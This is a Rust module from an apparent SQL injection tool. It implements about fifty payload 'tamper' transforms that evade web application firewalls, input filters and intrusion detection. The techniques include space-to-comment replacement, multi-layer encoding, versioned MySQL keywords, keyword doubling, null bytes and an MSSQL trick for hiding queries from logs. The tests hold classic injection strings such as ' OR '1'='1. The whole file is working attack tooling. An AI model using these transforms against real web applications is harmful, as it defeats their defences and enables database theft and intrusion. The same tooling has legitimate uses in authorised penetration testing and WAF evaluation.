//! SQL payload tamper/WAF-bypass modules (~50 transforms).
//!
//! Each tamper function transforms a SQL payload string to evade
//! web application firewalls, input filters, and intrusion detection
//! systems. A `TamperChain` applies multiple transforms in sequence.

use rand::Rng;
use rand::thread_rng;
use super::dbms::Dbms;

/// A tamper function signature.
pub type TamperFn = fn(payload: &str, dbms: Option<Dbms>) -> String;

/// An ordered chain of tamper modules applied sequentially.
#[derive(Debug, Clone, Default)]
pub struct TamperChain {
    modules: Vec<(&'static str, TamperFn)>,
}

impl TamperChain {
    /// Build a chain from comma-separated module names.
    pub fn from_names(names: &str) -> Self {
        let mut chain = Self::default();
        for name in names.split(',').map(str::trim).filter(|s| !s.is_empty()) {
            if let Some((static_name, f)) = lookup_tamper(name) {
                chain.modules.push((static_name, f));
            } else {
                tracing::warn!("unknown tamper module: {name}");
            }
        }
        chain
    }

    /// Apply all tamper transforms in order.
    pub fn apply(&self, payload: &str, dbms: Option<Dbms>) -> String {
        let mut result = payload.to_string();
        for (_, f) in &self.modules {
            result = f(&result, dbms);
        }
        result
    }

    pub fn is_empty(&self) -> bool {
        self.modules.is_empty()
    }

    pub fn len(&self) -> usize {
        self.modules.len()
    }
}

/// List all available tamper module names.
pub fn available_tampers() -> Vec<&'static str> {
    TAMPER_REGISTRY.iter().map(|(name, _)| *name).collect()
}

/// Look up a tamper function by name.
pub fn get_tamper(name: &str) -> Option<TamperFn> {
    TAMPER_REGISTRY
        .iter()
        .find(|(n, _)| n.eq_ignore_ascii_case(name))
        .map(|(_, f)| *f)
}

/// Look up a tamper entry by name, returning the static name and function.
fn lookup_tamper(name: &str) -> Option<(&'static str, TamperFn)> {
    TAMPER_REGISTRY
        .iter()
        .find(|(n, _)| n.eq_ignore_ascii_case(name))
        .map(|(n, f)| (*n, *f))
}

// ---------------------------------------------------------------------------
// Registry
// ---------------------------------------------------------------------------

static TAMPER_REGISTRY: &[(&str, TamperFn)] = &[
    // Space replacement (8)
    ("space2comment", space2comment),
    ("space2hash", space2hash),
    ("space2dash", space2dash),
    ("space2mssqlblank", space2mssqlblank),
    ("space2mssqlhash", space2mssqlhash),
    ("space2morehash", space2morehash),
    ("space2plus", space2plus),
    ("space2randomblank", space2randomblank),
    // Encoding (10)
    ("charencode", charencode),
    ("chardoubleencode", chardoubleencode),
    ("charunicodeencode", charunicodeencode),
    ("base64encode", base64encode),
    ("htmlencode", htmlencode),
    ("overlongutf8", overlongutf8),
    ("percentage", percentage),
    ("unionalltounion", unionalltounion),
    ("unmagicquotes", unmagicquotes),
    ("hex2char", hex2char),
    // Keyword obfuscation (12)
    ("randomcase", randomcase),
    ("randomcomments", randomcomments),
    ("versionedkeywords", versionedkeywords),
    ("versionedmorekeywords", versionedmorekeywords),
    ("halfversionedmorekeywords", halfversionedmorekeywords),
    ("informationschemacomment", informationschemacomment),
    ("capitalletters", capitalletters),
    ("lowercase", lowercase_tamper),
    ("concat2concatws", concat2concatws),
    ("commalesslimit", commalesslimit),
    ("commalessmid", commalessmid),
    ("commentbeforeparentheses", commentbeforeparentheses),
    // Comparison/logic (8)
    ("between", between),
    ("greatest", greatest),
    ("least", least_tamper),
    ("equaltolike", equaltolike),
    ("ifnull2casewhenisnull", ifnull2casewhenisnull),
    ("ifnull2ifisnull", ifnull2ifisnull),
    ("bluecoat", bluecoat),
    ("modsecurityversioned", modsecurityversioned),
    // Injection prefix/suffix (7)
    ("apostrophemask", apostrophemask),
    ("apostrophenullencode", apostrophenullencode),
    ("appendnullbyte", appendnullbyte),
    ("nonrecursivereplacement", nonrecursivereplacement),
    ("symboliclogical", symboliclogical),
    ("misunion", misunion),
    ("dunion", dunion),
    // Advanced/DBMS-specific (5)
    ("sp_password", sp_password),
    ("schemasplit", schemasplit),
    ("luanginx", luanginx),
    ("sleep2getlock", sleep2getlock),
    ("substr2mid", substr2mid),
];

// ===== Space Replacement (8) ==============================================

fn space2comment(payload: &str, _dbms: Option<Dbms>) -> String {
    replace_spaces(payload, "/**/")
}

fn space2hash(payload: &str, _dbms: Option<Dbms>) -> String {
    // MySQL-specific: # is a comment character
    replace_spaces(payload, "%23\n")
}

fn space2dash(payload: &str, _dbms: Option<Dbms>) -> String {
    replace_spaces(payload, "--%0A")
}

fn space2mssqlblank(payload: &str, _dbms: Option<Dbms>) -> String {
    let blanks = ["%01", "%02", "%03", "%04", "%05", "%06", "%07", "%08",
                  "%09", "%0B", "%0C", "%0D", "%0E", "%0F"];
    let mut rng = thread_rng();
    let mut result = String::with_capacity(payload.len() * 2);
    for ch in payload.chars() {
        if ch == ' ' {
            let idx = rng.gen_range(0..blanks.len());
            result.push_str(blanks[idx]);
        } else {
            result.push(ch);
        }
    }
    result
}

fn space2mssqlhash(payload: &str, _dbms: Option<Dbms>) -> String {
    replace_spaces(payload, "%23%0A")
}

fn space2morehash(payload: &str, _dbms: Option<Dbms>) -> String {
    // MySQL >=5.1: versioned comment with hash
    replace_spaces(payload, "%23/*!50000*/\n")
}

fn space2plus(payload: &str, _dbms: Option<Dbms>) -> String {
    replace_spaces(payload, "+")
}

fn space2randomblank(payload: &str, _dbms: Option<Dbms>) -> String {
    let blanks = ["%09", "%0A", "%0C", "%0D"];
    let mut rng = thread_rng();
    let mut result = String::with_capacity(payload.len() * 2);
    for ch in payload.chars() {
        if ch == ' ' {
            let idx = rng.gen_range(0..blanks.len());
            result.push_str(blanks[idx]);
        } else {
            result.push(ch);
        }
    }
    result
}

// ===== Encoding (10) ======================================================

fn charencode(payload: &str, _dbms: Option<Dbms>) -> String {
    payload
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == '*' || c == '-' || c == '.' || c == '_' {
                c.to_string()
            } else {
                format!("%{:02X}", c as u8)
            }
        })
        .collect()
}

fn chardoubleencode(payload: &str, _dbms: Option<Dbms>) -> String {
    // First encode, then encode the percent signs
    let first = charencode(payload, None);
    first.replace('%', "%25")
}

fn charunicodeencode(payload: &str, _dbms: Option<Dbms>) -> String {
    payload
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() {
                c.to_string()
            } else {
                format!("%u{:04X}", c as u32)
            }
        })
        .collect()
}

fn base64encode(payload: &str, _dbms: Option<Dbms>) -> String {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.encode(payload.as_bytes())
}

fn htmlencode(payload: &str, _dbms: Option<Dbms>) -> String {
    payload
        .chars()
        .map(|c| format!("&#{};", c as u32))
        .collect()
}

fn overlongutf8(payload: &str, _dbms: Option<Dbms>) -> String {
    // Replace ASCII with overlong 2-byte UTF-8 sequences
    payload
        .chars()
        .map(|c| {
            if c.is_ascii() && !c.is_ascii_alphanumeric() {
                let b = c as u8;
                format!("%{:02X}%{:02X}", 0xC0 | (b >> 6), 0x80 | (b & 0x3F))
            } else {
                c.to_string()
            }
        })
        .collect()
}

fn percentage(payload: &str, _dbms: Option<Dbms>) -> String {
    // MSSQL: insert % between keyword characters
    let mut result = String::with_capacity(payload.len() * 2);
    let mut in_keyword = false;
    for (i, ch) in payload.chars().enumerate() {
        if ch.is_ascii_alphabetic() {
            if !in_keyword {
                in_keyword = true;
            }
            result.push(ch);
            // Add % after letter if next char is also a letter (within keyword)
            if let Some(next) = payload.chars().nth(i + 1) {
                if next.is_ascii_alphabetic() {
                    result.push('%');
                }
            }
        } else {
            in_keyword = false;
            result.push(ch);
        }
    }
    result
}

fn unionalltounion(payload: &str, _dbms: Option<Dbms>) -> String {
    replace_keyword_ci(payload, "UNION ALL SELECT", "UNION SELECT")
}

fn unmagicquotes(payload: &str, _dbms: Option<Dbms>) -> String {
    // Bypass PHP magic_quotes by using wide character multibyte
    payload.replace('\'', "%BF%27")
}

fn hex2char(payload: &str, _dbms: Option<Dbms>) -> String {
    // Replace 0xNN hex literals with CHAR(NN)
    let re = regex::Regex::new(r"0x([0-9a-fA-F]{2})").unwrap();
    re.replace_all(payload, |caps: &regex::Captures| {
        let hex_val = u8::from_str_radix(&caps[1], 16).unwrap_or(0);
        format!("CHAR({})", hex_val)
    })
    .to_string()
}

// ===== Keyword Obfuscation (12) ===========================================

fn randomcase(payload: &str, _dbms: Option<Dbms>) -> String {
    let mut rng = thread_rng();
    payload
        .chars()
        .map(|c| {
            if c.is_ascii_alphabetic() {
                if rng.gen_bool(0.5) {
                    c.to_uppercase().to_string()
                } else {
                    c.to_lowercase().to_string()
                }
            } else {
                c.to_string()
            }
        })
        .collect()
}

fn randomcomments(payload: &str, _dbms: Option<Dbms>) -> String {
    // Insert /**/ inside SQL keywords
    let keywords = [
        "SELECT", "INSERT", "UPDATE", "DELETE", "FROM", "WHERE",
        "UNION", "ORDER", "GROUP", "HAVING", "LIMIT", "JOIN",
        "AND", "OR", "NOT", "LIKE", "BETWEEN", "INTO",
    ];
    let mut result = payload.to_string();
    let mut rng = thread_rng();
    for kw in keywords {
        if let Some(pos) = result.to_uppercase().find(kw) {
            if result.len() > pos + kw.len() / 2 {
                let split = rng.gen_range(1..kw.len());
                let before = &result[pos..pos + split];
                let after = &result[pos + split..pos + kw.len()];
                let replacement = format!("{before}/**/{after}");
                let orig = &result[pos..pos + kw.len()];
                result = result.replacen(orig, &replacement, 1);
            }
        }
    }
    result
}

fn versionedkeywords(payload: &str, _dbms: Option<Dbms>) -> String {
    // MySQL: wrap keywords in /*!50000 ... */
    let keywords = [
        "UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "FROM",
        "WHERE", "AND", "OR", "ORDER", "GROUP", "HAVING", "LIMIT",
        "JOIN", "NULL", "INTO", "SET", "VALUES",
    ];
    let mut result = payload.to_string();
    for kw in keywords {
        result = replace_keyword_ci(&result, kw, &format!("/*!50000 {kw}*/"));
    }
    result
}

fn versionedmorekeywords(payload: &str, _dbms: Option<Dbms>) -> String {
    let keywords = [
        "UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "FROM",
        "WHERE", "AND", "OR", "ORDER", "GROUP", "HAVING", "LIMIT",
        "JOIN", "NULL", "INTO", "SET", "VALUES", "LIKE", "BETWEEN",
        "NOT", "CASE", "WHEN", "THEN", "ELSE", "END", "CAST",
        "CONVERT", "CONCAT", "SUBSTRING", "MID", "LEFT", "RIGHT",
    ];
    let mut result = payload.to_string();
    for kw in keywords {
        result = replace_keyword_ci(&result, kw, &format!("/*!50000 {kw}*/"));
    }
    result
}

fn halfversionedmorekeywords(payload: &str, _dbms: Option<Dbms>) -> String {
    let keywords = [
        "UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "FROM",
        "WHERE", "AND", "OR",
    ];
    let mut result = payload.to_string();
    for kw in keywords {
        result = replace_keyword_ci(&result, kw, &format!("/*!{kw}"));
    }
    result
}

fn informationschemacomment(payload: &str, _dbms: Option<Dbms>) -> String {
    replace_keyword_ci(payload, "information_schema.", "information_schema/**/./**/")
}

fn capitalletters(payload: &str, _dbms: Option<Dbms>) -> String {
    payload.to_uppercase()
}

fn lowercase_tamper(payload: &str, _dbms: Option<Dbms>) -> String {
    payload.to_lowercase()
}

fn concat2concatws(payload: &str, _dbms: Option<Dbms>) -> String {
    // Replace CONCAT(a,b) with CONCAT_WS('',a,b)
    let re = regex::Regex::new(r"(?i)CONCAT\(").unwrap();
    re.replace_all(payload, "CONCAT_WS('',").to_string()
}

fn commalesslimit(payload: &str, _dbms: Option<Dbms>) -> String {
    // Replace LIMIT N,M with LIMIT M OFFSET N
    let re = regex::Regex::new(r"(?i)LIMIT\s+(\d+)\s*,\s*(\d+)").unwrap();
    re.replace_all(payload, "LIMIT $2 OFFSET $1").to_string()
}

fn commalessmid(payload: &str, _dbms: Option<Dbms>) -> String {
    // Replace MID(a,b,c) with MID(a FROM b FOR c)
    let re = regex::Regex::new(r"(?i)MID\(([^,]+),\s*(\d+)\s*,\s*(\d+)\)").unwrap();
    re.replace_all(payload, "MID($1 FROM $2 FOR $3)").to_string()
}

fn commentbeforeparentheses(payload: &str, _dbms: Option<Dbms>) -> String {
    payload.replace('(', "/**/(")
}

// ===== Comparison/Logic (8) ===============================================

fn between(payload: &str, _dbms: Option<Dbms>) -> String {
    // Replace > with NOT BETWEEN 0 AND
    let re = regex::Regex::new(r">\s*(\d+)").unwrap();
    re.replace_all(payload, "NOT BETWEEN 0 AND $1").to_string()
}

fn greatest(payload: &str, _dbms: Option<Dbms>) -> String {
    // Replace > with GREATEST equivalent
    let re = regex::Regex::new(r">\s*(\d+)").unwrap();
    re.replace_all(payload, |caps: &regex::Captures| {
        format!("-GREATEST(0,{}-1)", &caps[1])
    })
    .to_string()
}

fn least_tamper(payload: &str, _dbms: Option<Dbms>) -> String {
    // Replace < with LEAST equivalent
    let re = regex::Regex::new(r"<\s*(\d+)").unwrap();
    re.replace_all(payload, |caps: &regex::Captures| {
        format!("-LEAST(0,{}+1)", &caps[1])
    })
    .to_string()
}

fn equaltolike(payload: &str, _dbms: Option<Dbms>) -> String {
    payload.replace('=', " LIKE ")
}

fn ifnull2casewhenisnull(payload: &str, _dbms: Option<Dbms>) -> String {
    let re = regex::Regex::new(r"(?i)IFNULL\(([^,]+),\s*([^)]+)\)").unwrap();
    re.replace_all(payload, "CASE WHEN $1 IS NULL THEN $2 ELSE $1 END")
        .to_string()
}

fn ifnull2ifisnull(payload: &str, _dbms: Option<Dbms>) -> String {
    let re = regex::Regex::new(r"(?i)IFNULL\(([^,]+),\s*([^)]+)\)").unwrap();
    re.replace_all(payload, "IF(ISNULL($1),$2,$1)")
        .to_string()
}

fn bluecoat(payload: &str, _dbms: Option<Dbms>) -> String {
    let result = payload.replace('=', " LIKE ");
    replace_spaces(&result, "%09")
}

fn modsecurityversioned(payload: &str, _dbms: Option<Dbms>) -> String {
    format!("/*!{payload}*/")
}

// ===== Injection Prefix/Suffix (7) ========================================

fn apostrophemask(payload: &str, _dbms: Option<Dbms>) -> String {
    // Replace ' with UTF-8 fullwidth apostrophe
    payload.replace('\'', "%EF%BC%87")
}

fn apostrophenullencode(payload: &str, _dbms: Option<Dbms>) -> String {
    payload.replace('\'', "%00%27")
}

fn appendnullbyte(payload: &str, _dbms: Option<Dbms>) -> String {
    format!("{payload}%00")
}

fn nonrecursivereplacement(payload: &str, _dbms: Option<Dbms>) -> String {
    // Double keywords to bypass simple string removal filters
    let keywords = [
        ("SELECT", "SELSELECTECT"),
        ("UNION", "UNUNIONION"),
        ("INSERT", "INSINSERTERT"),
        ("UPDATE", "UPUPDATEDATE"),
        ("DELETE", "DELDELETEELETE"),
        ("FROM", "FRFROMOM"),
        ("WHERE", "WHWHEREERE"),
        ("AND", "AANDND"),
        ("OR", "OORR"),
    ];
    let mut result = payload.to_string();
    for (kw, doubled) in keywords {
        result = replace_keyword_ci(&result, kw, doubled);
    }
    result
}

fn symboliclogical(payload: &str, _dbms: Option<Dbms>) -> String {
    let result = replace_keyword_ci(payload, " AND ", " && ");
    replace_keyword_ci(&result, " OR ", " || ")
}

fn misunion(payload: &str, _dbms: Option<Dbms>) -> String {
    replace_keyword_ci(payload, "UNION", "-.1UNION")
}

fn dunion(payload: &str, _dbms: Option<Dbms>) -> String {
    replace_keyword_ci(payload, "UNION", "DUNION")
}

// ===== Advanced/DBMS-Specific (5) =========================================

fn sp_password(payload: &str, _dbms: Option<Dbms>) -> String {
    // MSSQL: append sp_password to hide query from T-SQL logs
    format!("{payload} -- sp_password")
}

fn schemasplit(payload: &str, _dbms: Option<Dbms>) -> String {
    // Split FROM schema.table into FROM (SELECT * FROM schema.table)
    let re = regex::Regex::new(r"(?i)FROM\s+(\w+)\.(\w+)").unwrap();
    re.replace_all(payload, "FROM (SELECT * FROM $1.$2) AS sq")
        .to_string()
}

fn luanginx(payload: &str, _dbms: Option<Dbms>) -> String {
    // Lua-Nginx WAF bypass
    format!("{payload}\r\n")
}

fn sleep2getlock(payload: &str, _dbms: Option<Dbms>) -> String {
    // MySQL: replace SLEEP() with GET_LOCK()
    let re = regex::Regex::new(r"(?i)SLEEP\((\d+)\)").unwrap();
    re.replace_all(payload, "GET_LOCK('corvex_lock',$1)")
        .to_string()
}

fn substr2mid(payload: &str, _dbms: Option<Dbms>) -> String {
    let re = regex::Regex::new(r"(?i)SUBSTR(ING)?\(").unwrap();
    re.replace_all(payload, "MID(").to_string()
}

// ===== Helpers =============================================================

fn replace_spaces(payload: &str, replacement: &str) -> String {
    // Only replace spaces that are not inside quotes
    let mut result = String::with_capacity(payload.len() * 2);
    let mut in_single = false;
    let mut in_double = false;
    for ch in payload.chars() {
        match ch {
            '\'' if !in_double => {
                in_single = !in_single;
                result.push(ch);
            }
            '"' if !in_single => {
                in_double = !in_double;
                result.push(ch);
            }
            ' ' if !in_single && !in_double => {
                result.push_str(replacement);
            }
            _ => result.push(ch),
        }
    }
    result
}

/// Case-insensitive whole-word keyword replacement.
fn replace_keyword_ci(payload: &str, keyword: &str, replacement: &str) -> String {
    let pattern = format!(r"(?i)\b{}\b", regex::escape(keyword));
    let re = regex::Regex::new(&pattern).unwrap();
    re.replace_all(payload, replacement).to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn space2comment_works() {
        assert_eq!(
            space2comment("SELECT * FROM users", None),
            "SELECT/**/*/**/FROM/**/users"
        );
    }

    #[test]
    fn randomcase_changes_case() {
        let result = randomcase("select", None);
        assert_eq!(result.to_lowercase(), "select");
    }

    #[test]
    fn appendnullbyte_appends() {
        assert_eq!(appendnullbyte("payload", None), "payload%00");
    }

    #[test]
    fn equaltolike_replaces() {
        assert_eq!(equaltolike("1=1", None), "1 LIKE 1");
    }

    #[test]
    fn tamper_chain_applies_multiple() {
        let chain = TamperChain::from_names("capitalletters,appendnullbyte");
        assert_eq!(chain.len(), 2);
        let result = chain.apply("select 1", None);
        assert_eq!(result, "SELECT 1%00");
    }

    #[test]
    fn available_tampers_count() {
        let tampers = available_tampers();
        assert!(tampers.len() >= 50, "Expected at least 50 tampers, got {}", tampers.len());
    }

    #[test]
    fn symboliclogical_replaces() {
        assert_eq!(
            symboliclogical("1 AND 1=1 OR 2=2", None),
            "1 && 1=1 || 2=2"
        );
    }

    #[test]
    fn commalesslimit_transforms() {
        assert_eq!(
            commalesslimit("LIMIT 5,10", None),
            "LIMIT 10 OFFSET 5"
        );
    }

    #[test]
    fn unmagicquotes_transforms() {
        assert_eq!(unmagicquotes("' OR '1'='1", None), "%BF%27 OR %BF%271%BF%27=%BF%271");
    }
}
